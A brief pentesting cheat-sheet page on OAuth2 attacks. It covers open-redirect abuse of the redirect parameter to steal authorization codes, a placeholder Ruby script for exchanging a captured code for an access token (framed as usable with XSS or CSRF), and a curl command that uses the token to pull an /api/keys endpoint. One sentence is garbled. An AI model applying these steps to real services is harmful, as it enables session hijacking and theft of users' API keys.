# OAuth2

## Open Redirect

When authorising with OAuth, then the redirect parameters for open redirects.  
This can be used to steal session codes from victims.  

## Get Access Tokens with Ruby

If you can create a resource, this script can be used with XSS or CSRF to steal sessions:  
Script from Louis at Pentesterlab  

```ruby
require 'oauth2'

callback = "[CALLBACK_URL]"
app_id = "[APPLICATION_ID]"

secret = "[SECRET]"
client = OAuth2::Client.new(app_id, secret, site: "[AUTHORIZATION_SERVER]")
client.auth_code.authorize_url(redirect_uri: callback)

code="[CODE]"
access = client.auth_code.get_token( code, redirect_uri: callback)
access.get("/api/user").parsed

puts access.token 
```

Feed the token returned from above into this command:  

```bash
curl -H 'Authorization: Bearer [TOKEN]' [RESOURCE_SERVER]/api/keys --dump-header -
```
